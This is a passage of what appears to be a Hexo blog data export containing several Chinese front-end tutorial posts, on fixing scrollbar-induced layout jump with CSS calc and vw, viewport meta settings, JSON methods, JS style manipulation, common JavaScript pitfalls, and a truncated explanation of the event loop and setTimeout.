id=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"><a href=\"#CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\" class=\"headerlink\" title=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"></a>CSS3计算<code>calc</code>和<code>vw</code>单位巧妙实现滚动条出现页面不跳动</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.wrap-outer &#123;</span><br><span class=\"line\">    margin-left: calc(100vw - 100%);</span><br><span class=\"line\">    // 或者</span><br><span class=\"line\">    padding-left: calc(100vw - 100%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>首先</strong>：<code>.wrap-outer</code>指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;</p>\n<p><strong>然后</strong>: <code>calc</code>是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);</p>\n<p><strong>最后</strong>: <code>100vw</code>相对于浏览器的<code>window.innerWidth</code>，是<code>浏览器内部宽度</code>，注意，<code>滚动条宽度也计算在内</code>！ 而<code>100%是可用宽度</code>，是<code>不含滚动条宽度</code>。</p>\n<p><strong>于是</strong>: <code>calc(100vw - 100%)</code>就是<code>浏览器滚动条宽度</code>(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！</p>\n<h3 id=\"兼容性\"><a href=\"#兼容性\" class=\"headerlink\" title=\"兼容性\"></a><strong>兼容性</strong></h3><p>支持：<code>IE9+</code> 以及其他现代浏览器。</p>\n<h3 id=\"窄屏幕宽度下的处理\"><a href=\"#窄屏幕宽度下的处理\" class=\"headerlink\" title=\"窄屏幕宽度下的处理\"></a><strong>窄屏幕宽度下的处理</strong></h3><p>上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@media screen and (min-width: 1150px) &#123;</span><br><span class=\"line\">   .wrap-outer &#123;</span><br><span class=\"line\">       margin-left: calc(100vw - 100%);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"更新于2016年9月28日\"><a href=\"#更新于2016年9月28日\" class=\"headerlink\" title=\"更新于2016年9月28日\"></a>更新于2016年9月28日</h2><p>经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了<code>更加终极的解决方案</code>，经过大型项目实践已经验证相当具有可行性，这里特意分享下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">html &#123;</span><br><span class=\"line\">  overflow-y: scroll;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root &#123;</span><br><span class=\"line\">  overflow-y: auto;</span><br><span class=\"line\">  overflow-x: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root body &#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">body &#123;</span><br><span class=\"line\">  width: 100vw;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三、结束语\"><a href=\"#三、结束语\" class=\"headerlink\" title=\"三、结束语\"></a>三、结束语</h2><p>本文参考自：<a href=\"https://aykevl.nl/2014/09/fix-jumping-scrollbar\" target=\"_blank\" rel=\"noopener\">Fix ‘jumping scrollbar’ issue using only CSS</a></p>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"水平居中布局与滚动条跳动的千年难题\"><a href=\"#水平居中布局与滚动条跳动的千年难题\" class=\"headerlink\" title=\"水平居中布局与滚动条跳动的千年难题\"></a>水平居中布局与滚动条跳动的千年难题</h2><p>1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。</p>\n<p>2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。</p>\n<p>3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！</p>\n<h2 id=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"><a href=\"#CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\" class=\"headerlink\" title=\"CSS3计算calc和vw单位巧妙实现滚动条出现页面不跳动\"></a>CSS3计算<code>calc</code>和<code>vw</code>单位巧妙实现滚动条出现页面不跳动</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.wrap-outer &#123;</span><br><span class=\"line\">    margin-left: calc(100vw - 100%);</span><br><span class=\"line\">    // 或者</span><br><span class=\"line\">    padding-left: calc(100vw - 100%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>首先</strong>：<code>.wrap-outer</code>指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;</p>\n<p><strong>然后</strong>: <code>calc</code>是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);</p>\n<p><strong>最后</strong>: <code>100vw</code>相对于浏览器的<code>window.innerWidth</code>，是<code>浏览器内部宽度</code>，注意，<code>滚动条宽度也计算在内</code>！ 而<code>100%是可用宽度</code>，是<code>不含滚动条宽度</code>。</p>\n<p><strong>于是</strong>: <code>calc(100vw - 100%)</code>就是<code>浏览器滚动条宽度</code>(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！</p>\n<h3 id=\"兼容性\"><a href=\"#兼容性\" class=\"headerlink\" title=\"兼容性\"></a><strong>兼容性</strong></h3><p>支持：<code>IE9+</code> 以及其他现代浏览器。</p>\n<h3 id=\"窄屏幕宽度下的处理\"><a href=\"#窄屏幕宽度下的处理\" class=\"headerlink\" title=\"窄屏幕宽度下的处理\"></a><strong>窄屏幕宽度下的处理</strong></h3><p>上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@media screen and (min-width: 1150px) &#123;</span><br><span class=\"line\">   .wrap-outer &#123;</span><br><span class=\"line\">       margin-left: calc(100vw - 100%);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"更新于2016年9月28日\"><a href=\"#更新于2016年9月28日\" class=\"headerlink\" title=\"更新于2016年9月28日\"></a>更新于2016年9月28日</h2><p>经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了<code>更加终极的解决方案</code>，经过大型项目实践已经验证相当具有可行性，这里特意分享下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">html &#123;</span><br><span class=\"line\">  overflow-y: scroll;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root &#123;</span><br><span class=\"line\">  overflow-y: auto;</span><br><span class=\"line\">  overflow-x: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">:root body &#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">body &#123;</span><br><span class=\"line\">  width: 100vw;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三、结束语\"><a href=\"#三、结束语\" class=\"headerlink\" title=\"三、结束语\"></a>三、结束语</h2><p>本文参考自：<a href=\"https://aykevl.nl/2014/09/fix-jumping-scrollbar\" target=\"_blank\" rel=\"noopener\">Fix ‘jumping scrollbar’ issue using only CSS</a></p>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"视口定宽布局","date":"2018-05-17T01:43:01.000Z","_content":"## 固定视口宽度，自动缩放\n\n````\n<meta name=\"viewport\" content=\"width=640, user-scalable=no, target-densitydpi=device-dpi\">\n````\n\n强制固定视口宽度为`content=\"width=640`,这样无论任何分辨率下，都缩放该比率的页面。\n\n","source":"_posts/FrontEnd/HTML+CSS/视口定宽布局.md","raw":"---\ntitle: 视口定宽布局\ndate: 2018-05-17 09:43:01\ntags: viewport\ncategories: CSS\n---\n## 固定视口宽度，自动缩放\n\n````\n<meta name=\"viewport\" content=\"width=640, user-scalable=no, target-densitydpi=device-dpi\">\n````\n\n强制固定视口宽度为`content=\"width=640`,这样无论任何分辨率下，都缩放该比率的页面。\n\n","slug":"FrontEnd/HTML+CSS/视口定宽布局","published":1,"updated":"2018-05-25T01:56:00.560Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2c4005wb8xjuen8m1lj","content":"<h2 id=\"固定视口宽度，自动缩放\"><a href=\"#固定视口宽度，自动缩放\" class=\"headerlink\" title=\"固定视口宽度，自动缩放\"></a>固定视口宽度，自动缩放</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta name=&quot;viewport&quot; content=&quot;width=640, user-scalable=no, target-densitydpi=device-dpi&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>强制固定视口宽度为<code>content=&quot;width=640</code>,这样无论任何分辨率下，都缩放该比率的页面。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"固定视口宽度，自动缩放\"><a href=\"#固定视口宽度，自动缩放\" class=\"headerlink\" title=\"固定视口宽度，自动缩放\"></a>固定视口宽度，自动缩放</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta name=&quot;viewport&quot; content=&quot;width=640, user-scalable=no, target-densitydpi=device-dpi&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>强制固定视口宽度为<code>content=&quot;width=640</code>,这样无论任何分辨率下，都缩放该比率的页面。</p>\n"},{"title":"JS-BOM","date":"2018-05-14T07:48:51.000Z","_content":"document.documentElement.clientWidth // 设备宽度\n\nwindow.innerWidth  // 窗口宽度\n\ndocument.documentElement.style.fontSize // 根节点 fontSize: string\n\n let rootFZ = Number(document.documentElement.style.fontSize.split('px')[0]); // 根节点 fontSize: number\n\n### 事件监听\n`onTransitionEnd`","source":"_posts/FrontEnd/JS/JS-BOM.md","raw":"---\ntitle: JS-BOM\ndate: 2018-05-14 15:48:51\ntags: BOM\ncategories: JS\n---\ndocument.documentElement.clientWidth // 设备宽度\n\nwindow.innerWidth  // 窗口宽度\n\ndocument.documentElement.style.fontSize // 根节点 fontSize: string\n\n let rootFZ = Number(document.documentElement.style.fontSize.split('px')[0]); // 根节点 fontSize: number\n\n### 事件监听\n`onTransitionEnd`","slug":"FrontEnd/JS/JS-BOM","published":1,"updated":"2018-06-09T08:49:06.253Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2c70060b8xjq4l32jiu","content":"<p>document.documentElement.clientWidth // 设备宽度</p>\n<p>window.innerWidth  // 窗口宽度</p>\n<p>document.documentElement.style.fontSize // 根节点 fontSize: string</p>\n<p> let rootFZ = Number(document.documentElement.style.fontSize.split(‘px’)[0]); // 根节点 fontSize: number</p>\n<h3 id=\"事件监听\"><a href=\"#事件监听\" class=\"headerlink\" title=\"事件监听\"></a>事件监听</h3><p><code>onTransitionEnd</code></p>\n","site":{"data":{}},"excerpt":"","more":"<p>document.documentElement.clientWidth // 设备宽度</p>\n<p>window.innerWidth  // 窗口宽度</p>\n<p>document.documentElement.style.fontSize // 根节点 fontSize: string</p>\n<p> let rootFZ = Number(document.documentElement.style.fontSize.split(‘px’)[0]); // 根节点 fontSize: number</p>\n<h3 id=\"事件监听\"><a href=\"#事件监听\" class=\"headerlink\" title=\"事件监听\"></a>事件监听</h3><p><code>onTransitionEnd</code></p>\n"},{"title":"JSON方法","date":"2018-07-04T01:56:44.000Z","_content":"## JSON的食用方法\n````\nJSON.stringify()  // 把一个对象转换成json字符串， \nJSON.parse()  // 把一个json字符串解析成对象。。\n````\n","source":"_posts/FrontEnd/JS/JSON方法.md","raw":"---\ntitle: JSON方法\ndate: 2018-07-04 09:56:44\ntags: JSON\ncategories: JSON\n---\n## JSON的食用方法\n````\nJSON.stringify()  // 把一个对象转换成json字符串， \nJSON.parse()  // 把一个json字符串解析成对象。。\n````\n","slug":"FrontEnd/JS/JSON方法","published":1,"updated":"2018-07-04T01:58:28.700Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2c80063b8xj94vcba5s","content":"<h2 id=\"JSON的食用方法\"><a href=\"#JSON的食用方法\" class=\"headerlink\" title=\"JSON的食用方法\"></a>JSON的食用方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.stringify()  // 把一个对象转换成json字符串， </span><br><span class=\"line\">JSON.parse()  // 把一个json字符串解析成对象。。</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JSON的食用方法\"><a href=\"#JSON的食用方法\" class=\"headerlink\" title=\"JSON的食用方法\"></a>JSON的食用方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.stringify()  // 把一个对象转换成json字符串， </span><br><span class=\"line\">JSON.parse()  // 把一个json字符串解析成对象。。</span><br></pre></td></tr></table></figure>\n"},{"title":"修改样式","date":"2018-05-29T02:15:08.000Z","_content":"## JS修改CSS样式\n\n### 1. `setAttribute`\n````\nlet evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n\nevedd.setAttribute('style', `height: 0px`)\n````\n\n### 2. `.style`\n````\ndocument.documentElement.style.fontSize\n    = document.documentElement.clientWidth / 3.75 + 'px';\n````","source":"_posts/FrontEnd/JS/JS修改样式.md","raw":"---\ntitle: 修改样式\ndate: 2018-05-29 10:15:08\ntags: JS修改样式\ncategories: JS修改CSS\n---\n## JS修改CSS样式\n\n### 1. `setAttribute`\n````\nlet evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n\nevedd.setAttribute('style', `height: 0px`)\n````\n\n### 2. `.style`\n````\ndocument.documentElement.style.fontSize\n    = document.documentElement.clientWidth / 3.75 + 'px';\n````","slug":"FrontEnd/JS/JS修改样式","published":1,"updated":"2018-05-29T02:18:57.082Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ca0066b8xjppruvw7c","content":"<h2 id=\"JS修改CSS样式\"><a href=\"#JS修改CSS样式\" class=\"headerlink\" title=\"JS修改CSS样式\"></a>JS修改CSS样式</h2><h3 id=\"1-setAttribute\"><a href=\"#1-setAttribute\" class=\"headerlink\" title=\"1. setAttribute\"></a>1. <code>setAttribute</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\"></span><br><span class=\"line\">evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-style\"><a href=\"#2-style\" class=\"headerlink\" title=\"2. .style\"></a>2. <code>.style</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.documentElement.style.fontSize</span><br><span class=\"line\">    = document.documentElement.clientWidth / 3.75 + &apos;px&apos;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JS修改CSS样式\"><a href=\"#JS修改CSS样式\" class=\"headerlink\" title=\"JS修改CSS样式\"></a>JS修改CSS样式</h2><h3 id=\"1-setAttribute\"><a href=\"#1-setAttribute\" class=\"headerlink\" title=\"1. setAttribute\"></a>1. <code>setAttribute</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\"></span><br><span class=\"line\">evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-style\"><a href=\"#2-style\" class=\"headerlink\" title=\"2. .style\"></a>2. <code>.style</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.documentElement.style.fontSize</span><br><span class=\"line\">    = document.documentElement.clientWidth / 3.75 + &apos;px&apos;;</span><br></pre></td></tr></table></figure>"},{"title":"JS常见陷阱","date":"2018-05-05T02:36:51.000Z","archives":"JS","_content":"# JavaScript中8个常见的陷阱\n## 1. 数组元素排序\nJavaScript默认使用`字典序(alphanumeric)`来排序。因此，`[1,2,5,10].sort()`的结果是`[1, 10, 2, 5]`。\n\n如果你想正确的排序，应该这样做：`[1,2,5,10].sort((a, b) => a - b)`\n\n## 2. new Date()\n`new Date()`的使用方法有：\n+ 不接收任何参数：返回当前时间；\n+ 接收一个参数x: 返回1970年1月1日 + x毫秒的值。\n+ new Date(1, 1, 1)返回1901年2月1号。\n+ new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。\n\n## 3. 替换函数(replace)\n\n    let s = \"bob\"\n    const replaced = s.replace('b', 'l')\n    replaced === \"lob\" // 只会替换掉第一个b\n    s === \"bob\" // 并且s的值不会变  \n\n如果想把所有`b`都替换掉，要使用正则：\n\n    \"bob\".replace(/b/g, 'l') === 'lol'\n\n## 4. 谨慎对待比较运算\n  // 这些可以\n  'abc' === 'abc' // true\n  1 === 1         // true\n  // 然而这些不行\n  [1,2,3] === [1,2,3] // false\n  {a: 1} === {a: 1}   // false\n  {} === {}           // false\n\n  因为`[1,2,3]`和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。\n\n","source":"_posts/FrontEnd/JS/JS常见陷阱.md","raw":"---\ntitle: JS常见陷阱\ndate: 2018-05-05 10:36:51\ntags: JS常见坑\narchives: JS\ncategories: JS\n---\n# JavaScript中8个常见的陷阱\n## 1. 数组元素排序\nJavaScript默认使用`字典序(alphanumeric)`来排序。因此，`[1,2,5,10].sort()`的结果是`[1, 10, 2, 5]`。\n\n如果你想正确的排序，应该这样做：`[1,2,5,10].sort((a, b) => a - b)`\n\n## 2. new Date()\n`new Date()`的使用方法有：\n+ 不接收任何参数：返回当前时间；\n+ 接收一个参数x: 返回1970年1月1日 + x毫秒的值。\n+ new Date(1, 1, 1)返回1901年2月1号。\n+ new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。\n\n## 3. 替换函数(replace)\n\n    let s = \"bob\"\n    const replaced = s.replace('b', 'l')\n    replaced === \"lob\" // 只会替换掉第一个b\n    s === \"bob\" // 并且s的值不会变  \n\n如果想把所有`b`都替换掉，要使用正则：\n\n    \"bob\".replace(/b/g, 'l') === 'lol'\n\n## 4. 谨慎对待比较运算\n  // 这些可以\n  'abc' === 'abc' // true\n  1 === 1         // true\n  // 然而这些不行\n  [1,2,3] === [1,2,3] // false\n  {a: 1} === {a: 1}   // false\n  {} === {}           // false\n\n  因为`[1,2,3]`和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。\n\n","slug":"FrontEnd/JS/JS常见陷阱","published":1,"updated":"2018-05-05T09:35:46.044Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cc006ab8xjr8zitq3a","content":"<h1 id=\"JavaScript中8个常见的陷阱\"><a href=\"#JavaScript中8个常见的陷阱\" class=\"headerlink\" title=\"JavaScript中8个常见的陷阱\"></a>JavaScript中8个常见的陷阱</h1><h2 id=\"1-数组元素排序\"><a href=\"#1-数组元素排序\" class=\"headerlink\" title=\"1. 数组元素排序\"></a>1. 数组元素排序</h2><p>JavaScript默认使用<code>字典序(alphanumeric)</code>来排序。因此，<code>[1,2,5,10].sort()</code>的结果是<code>[1, 10, 2, 5]</code>。</p>\n<p>如果你想正确的排序，应该这样做：<code>[1,2,5,10].sort((a, b) =&gt; a - b)</code></p>\n<h2 id=\"2-new-Date\"><a href=\"#2-new-Date\" class=\"headerlink\" title=\"2. new Date()\"></a>2. new Date()</h2><p><code>new Date()</code>的使用方法有：</p>\n<ul>\n<li>不接收任何参数：返回当前时间；</li>\n<li>接收一个参数x: 返回1970年1月1日 + x毫秒的值。</li>\n<li>new Date(1, 1, 1)返回1901年2月1号。</li>\n<li>new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。</li>\n</ul>\n<h2 id=\"3-替换函数-replace\"><a href=\"#3-替换函数-replace\" class=\"headerlink\" title=\"3. 替换函数(replace)\"></a>3. 替换函数(replace)</h2><pre><code>let s = &quot;bob&quot;\nconst replaced = s.replace(&apos;b&apos;, &apos;l&apos;)\nreplaced === &quot;lob&quot; // 只会替换掉第一个b\ns === &quot;bob&quot; // 并且s的值不会变  \n</code></pre><p>如果想把所有<code>b</code>都替换掉，要使用正则：</p>\n<pre><code>&quot;bob&quot;.replace(/b/g, &apos;l&apos;) === &apos;lol&apos;\n</code></pre><h2 id=\"4-谨慎对待比较运算\"><a href=\"#4-谨慎对待比较运算\" class=\"headerlink\" title=\"4. 谨慎对待比较运算\"></a>4. 谨慎对待比较运算</h2><p>  // 这些可以<br>  ‘abc’ === ‘abc’ // true<br>  1 === 1         // true<br>  // 然而这些不行<br>  [1,2,3] === [1,2,3] // false<br>  {a: 1} === {a: 1}   // false<br>  {} === {}           // false</p>\n<p>  因为<code>[1,2,3]</code>和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JavaScript中8个常见的陷阱\"><a href=\"#JavaScript中8个常见的陷阱\" class=\"headerlink\" title=\"JavaScript中8个常见的陷阱\"></a>JavaScript中8个常见的陷阱</h1><h2 id=\"1-数组元素排序\"><a href=\"#1-数组元素排序\" class=\"headerlink\" title=\"1. 数组元素排序\"></a>1. 数组元素排序</h2><p>JavaScript默认使用<code>字典序(alphanumeric)</code>来排序。因此，<code>[1,2,5,10].sort()</code>的结果是<code>[1, 10, 2, 5]</code>。</p>\n<p>如果你想正确的排序，应该这样做：<code>[1,2,5,10].sort((a, b) =&gt; a - b)</code></p>\n<h2 id=\"2-new-Date\"><a href=\"#2-new-Date\" class=\"headerlink\" title=\"2. new Date()\"></a>2. new Date()</h2><p><code>new Date()</code>的使用方法有：</p>\n<ul>\n<li>不接收任何参数：返回当前时间；</li>\n<li>接收一个参数x: 返回1970年1月1日 + x毫秒的值。</li>\n<li>new Date(1, 1, 1)返回1901年2月1号。</li>\n<li>new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。</li>\n</ul>\n<h2 id=\"3-替换函数-replace\"><a href=\"#3-替换函数-replace\" class=\"headerlink\" title=\"3. 替换函数(replace)\"></a>3. 替换函数(replace)</h2><pre><code>let s = &quot;bob&quot;\nconst replaced = s.replace(&apos;b&apos;, &apos;l&apos;)\nreplaced === &quot;lob&quot; // 只会替换掉第一个b\ns === &quot;bob&quot; // 并且s的值不会变  \n</code></pre><p>如果想把所有<code>b</code>都替换掉，要使用正则：</p>\n<pre><code>&quot;bob&quot;.replace(/b/g, &apos;l&apos;) === &apos;lol&apos;\n</code></pre><h2 id=\"4-谨慎对待比较运算\"><a href=\"#4-谨慎对待比较运算\" class=\"headerlink\" title=\"4. 谨慎对待比较运算\"></a>4. 谨慎对待比较运算</h2><p>  // 这些可以<br>  ‘abc’ === ‘abc’ // true<br>  1 === 1         // true<br>  // 然而这些不行<br>  [1,2,3] === [1,2,3] // false<br>  {a: 1} === {a: 1}   // false<br>  {} === {}           // false</p>\n<p>  因为<code>[1,2,3]</code>和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。</p>\n"},{"title":"JS执行机制与异步回调","date":"2018-05-09T06:38:24.000Z","_content":"## [转][理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)](https://blog.csdn.net/haoaiqian/article/details/78622651)\n'`javascript执行机制`' / '`代码执行顺序`' / '`函数生命周期加载`' 等类似问题 都与`javascript执行机制`相关。\n\n## 1. 关于JavaScript\n`JavaScript` 是一门 `单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`JS 是单线程`这一`核心仍未改变`。所以一切`JS 版的\"多线程\"都是用单线程模拟出来的`，一切 JavaScript `多线程` 都是`纸老虎`！\n\n## 2. JavaScript事件循环\n既然JS是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\\\n打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。\n+ 异步任务\\\n  而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。\n  \n  关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n  \n  导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n  上述过程会不断重复，也就是所谓的 `Event Loop(事件循环)`。\n\n  我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n## 3. [又爱又恨的setTimeout](https://juejin.im/post/59e85eebf265da430d571f89)\n\n大名鼎鼎的`setTimeout`无需再多言，大家对他的第一印象就是`异步`可以`延时执行`，我们经常这么实现延时3秒执行：\n````\nsetTimeout(() => {\n    console.log('延时3秒');\n},3000)\n````\n\n随着`setTimeout`使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？\n\n渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？\n\n先看一个例子：\n````\nsetTimeout(() => {\n    task();\n},3000)\nconsole.log('执行console');\n````\n\n根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：\n````\n//执行console\n//task()\n````\n\n去验证一下，结果正确！\n然后我们修改一下前面的代码：\n````\nsetTimeout(() => {\n    